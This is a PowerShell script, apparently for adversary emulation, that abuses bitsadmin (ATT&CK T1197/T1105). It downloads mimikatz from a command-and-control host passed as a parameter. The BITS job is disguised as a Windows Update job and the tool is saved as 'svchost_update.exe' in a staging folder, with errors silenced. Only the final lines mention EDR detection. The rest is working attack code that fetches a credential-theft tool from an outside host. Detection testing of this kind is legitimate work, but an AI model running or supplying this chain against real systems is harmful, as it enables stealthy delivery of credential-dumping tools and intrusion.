param(
    [Parameter(Mandatory=$true)]
    [string]$C2Host
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting LOLBin Download Chain - bitsadmin..." -ForegroundColor Cyan

# T1197 - BITS Jobs
# T1105 - Ingress Tool Transfer
# bitsadmin.exe abuses Background Intelligent Transfer Service for stealthy downloads

Write-Host "[*] [T1197] bitsadmin download - stealthy BITS transfer" -ForegroundColor Yellow
Write-Host "[!] C2 Server: http://$C2Host/tools/" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

# Create BITS job - this is the stealthy method
Write-Host "`n[*] [T1197] Creating BITS download job for mimikatz..."
$jobName = "WindowsUpdate_" + (Get-Random -Minimum 1000 -Maximum 9999)
Write-Host "    Job Name: $jobName (disguised as Windows Update)"
Write-Host "    CMD: bitsadmin /create $jobName"
bitsadmin /create $jobName

# Add file to job
Write-Host "`n[*] Adding download file to BITS job..."
Write-Host "    CMD: bitsadmin /addfile $jobName http://$C2Host/tools/mimikatz.exe $stagingDir\svchost_update.exe"
bitsadmin /addfile $jobName "http://$C2Host/tools/mimikatz.exe" "$stagingDir\svchost_update.exe"

# Set job priority and properties
Write-Host "`n[*] Configuring BITS job properties..."
bitsadmin /setpriority $jobName HIGH
bitsadmin /setnotifycmdline $jobName "%COMSPEC%" "/c echo Download complete"

# Resume the job to start download
Write-Host "`n[*] Starting BITS download..."
Write-Host "    CMD: bitsadmin /resume $jobName"
bitsadmin /resume $jobName

# Wait for completion
Write-Host "[*] Waiting for BITS transfer..."
$retries = 0
do {
    Start-Sleep -Seconds 2
    $state = bitsadmin /info $jobName /verbose 2>&1
    $retries++
    Write-Host "    [*] Transfer in progress... (attempt $retries)"
} while ($state -notmatch "TRANSFERRED|ERROR" -and $retries -lt 10)

# Complete the job
Write-Host "`n[*] Completing BITS job..."
bitsadmin /complete $jobName

if (Test-Path "$stagingDir\svchost_update.exe") {
    $size = (Get-Item "$stagingDir\svchost_update.exe").Length
    Write-Host "[+] Download successful: $stagingDir\svchost_update.exe ($size bytes)" -ForegroundColor Green
} else {
    Write-Host "[-] Download failed (ensure C2 is hosting the file)" -ForegroundColor Red
}

# List active BITS jobs (useful for blue team)
Write-Host "`n[*] Current BITS jobs on system:"
bitsadmin /list /allusers

Write-Host "`n[+] LOLBin Download Chain (bitsadmin) Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: BITS job creation, suspicious download URLs" -ForegroundColor Yellow
